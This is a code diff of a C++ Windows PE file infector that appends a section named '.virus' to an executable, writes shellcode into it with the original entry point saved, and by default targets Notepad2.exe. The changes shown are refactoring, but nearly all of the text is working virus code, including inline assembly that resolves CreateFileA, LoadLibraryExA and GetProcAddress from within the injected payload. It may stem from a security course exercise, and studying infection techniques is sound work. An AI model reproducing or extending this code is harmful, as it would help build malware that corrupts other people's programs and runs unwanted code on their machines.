@@ -9,8 +9,8 @@
 #include <iostream>
 #include <windows.h>
 
-#define INFECT_FLAG_1 0x1234
-#define INFECT_FLAG_2 0x5566
+#define INFECT_FLAG_1 0xDEAD
+#define INFECT_FLAG_2 0xBEEF
 #define INFECT_SEC_NAME ".virus"
 
 using namespace std;
@@ -90,22 +90,21 @@ class Modifier {
 public:
     explicit Modifier(LPCSTR fName) {
         fileName = fName;
-        if (!createHandleAndMap()) {
+        if (!createHandleAndMap(fName)) {
             cout << "[ERROR]Initialize failed." << endl;
             exit(-1);
         }
     }
 
-    BOOL createHandleAndMap() {
+    BOOL createHandleAndMap(LPCSTR fName) {
         // create file handle
-        hFile = CreateFileA(fileName,
-                            GENERIC_READ | GENERIC_WRITE,
-                            FILE_SHARE_READ,
-                            nullptr,
-                            OPEN_EXISTING,
-                            FILE_ATTRIBUTE_NORMAL,
-                            nullptr);
-
+        hFile = CreateFile(fName,
+                           GENERIC_READ | GENERIC_WRITE,
+                           FILE_SHARE_READ,
+                           nullptr,
+                           OPEN_EXISTING,
+                           FILE_ATTRIBUTE_NORMAL,
+                           nullptr);
         if (hFile == INVALID_HANDLE_VALUE) {
             cout << "[OpenError]Open file failed." << endl;
             return FALSE;
@@ -115,12 +114,12 @@ public:
         cout << "File size: " << fSize << endl;
 
         // create file handle mapping
-        hMap = CreateFileMappingA(hFile,
-                                  nullptr,
-                                  PAGE_READWRITE | SEC_COMMIT,
-                                  0,
-                                  0,
-                                  nullptr);
+        hMap = CreateFileMapping(hFile,
+                                 nullptr,
+                                 PAGE_READWRITE | SEC_COMMIT,
+                                 0,
+                                 0,
+                                 nullptr);
         if (hMap == nullptr) {
             cout << "[MappingError]Mapping failed." << endl;
             CloseHandle(hFile);
@@ -223,7 +222,7 @@ public:
         cout << ">>>End<<<" << endl << endl;
 
         // copy the new section head into the new section location
-        memcpy(newSecLoc, newSec, sizeof(IMAGE_SECTION_HEADER));
+        CopyMemory(newSecLoc, newSec, sizeof(IMAGE_SECTION_HEADER));
 
         // fix the head info
         // every members' concept can be easily recognized by those names
@@ -245,13 +244,13 @@ public:
         auto backup = new BYTE[bakSize];
 
         // copy the backup data to 'backup' array
-        memcpy(backup, bakPt + fStart, bakSize);
+        CopyMemory(backup, bakPt + fStart, bakSize);
 
         // get the new section content, then copy them to new array
         auto newSecData = new BYTE[newSec->SizeOfRawData];
         ZeroMemory(newSecData, newSec->SizeOfRawData);
-        memcpy(newSecData, &oldEntryPt, sizeof(DWORD));
-        memcpy(newSecData + sizeof(DWORD), (BYTE *)start, end - start);
+        CopyMemory(newSecData, &oldEntryPt, sizeof(DWORD));
+        CopyMemory(newSecData + sizeof(DWORD), (BYTE *)start, end - start);
 
         // write-in the new section data, then write-in the backup data
         // firstly need to set the file-pointer to backup-pointer
@@ -272,7 +271,7 @@ public:
 
     BOOL newSectorContent(DWORD oep, DWORD &start, DWORD &end) {
         if (parser == nullptr) {
-           return FALSE;
+            return FALSE;
         }
 
         // new segment pointer, pointing the SHELLCODE
@@ -392,13 +391,13 @@ public:
             push edx                    ; file name
             call [ebx]                  ; call 'CreateFileA'
             mov esp, ebx
-                                        ; Now the Stack looks like this, we need to restore it with 'pop':
+            ; Now the Stack looks like this, we need to restore it with 'pop':
             pop eax                     ; [esp]:        addr of func 'CreateFileA'
             pop eax                     ; [esp + 4]:    addr of loaded dll addr
             pop eax                     ; [esp + 8]:    addr of func 'LoadLibraryExA'
             pop eax                     ; [esp + 12]:   addr of func 'GetProcAddress'
             pop eax                     ; [esp + 16]:   addr of base dll addr
-                                        ; above all poped, return address left in the stack
+            ; above all poped, return address left in the stack
             pop edi                     ; get the return address
             sub edi, 5                  ; sub the bias of 'call' command ('call' 1 byte, address 4 bytes)
 
@@ -459,13 +458,8 @@ int main(int argc, char **argv) {
 
     // if command params exist, infect that
     // or infect the default
-    if (argc == 1) {
-        fileName = "Notepad2.exe";
-    } else {
-        fileName = argv[1];
-    }
+    fileName = argc == 1 ? "Notepad2.exe" : argv[1];
 
     auto modifier = Modifier(fileName);
-    modifier.addNewSector();
-    return 0;
+    return modifier.addNewSector() ? 0 : 1;
 }
